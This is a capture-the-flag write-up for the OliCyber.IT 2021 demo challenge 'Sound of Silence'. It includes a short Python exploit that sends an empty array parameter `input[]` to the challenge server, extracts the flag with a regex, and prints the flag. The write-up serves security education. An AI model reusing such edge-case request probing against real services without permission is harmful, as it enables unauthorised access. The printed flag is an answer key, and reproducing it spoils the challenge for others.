#   OliCyber.IT 2021 - DEMO Competizione nazionale

# Sound of Silence – Writeup

## Challenge Description

Devi dirmi qualcosa ma devi stare in silenzio, ne sei capace?

Site: [http://soundofsilence.challs.olicyber.it](http://soundofsilence.challs.olicyber.it)

---
## Vulnerability

The application generates a waveform (volume signal) based on the user’s input. By submitting an **empty input**, we essentially send "silence."
This special case triggers the server to reveal the flag in the HTTP response.
---
## Exploit

```python
import requests
import re

url = 'http://soundofsilence.challs.olicyber.it/'
r = requests.post(url, data={'input[]': ''})
flag = re.findall(r'flag\{.*?\}', r.text, re.DOTALL)
print(flag[0])
```
---
## Code Analysis

1. **Endpoint Interaction**

   * The exploit sends a POST request with the parameter `input[]` set to an empty string.
   * This simulates silence (no waveform).

2. **Server Behavior**

   * The challenge is built to output the flag when silence is provided as input.
   * This behavior is hidden from normal usage but can be exploited with direct requests.

3. **Regex Extraction**

   * The regex pattern `flag\{.*?\}` captures the flag from the response body.
   * The first match is then printed.
---
## Exploitation Steps

1. Discover the input parameter controlling the waveform (`input[]`).
2. Send silence as input by setting it to an empty string.
3. Receive the server’s special response containing the flag.
4. Extract the flag with regex.
---
## Solution

Running the exploit retrieves the flag:

```
flag{w0w_you_jus7_found_the_s0und_of_silenc3!}
```
---
## Key Takeaway

This challenge shows how **special input values** (like silence in an audio-based system) can lead to unintended behavior. Edge cases must always be handled securely, as they may leak sensitive data such as flags.
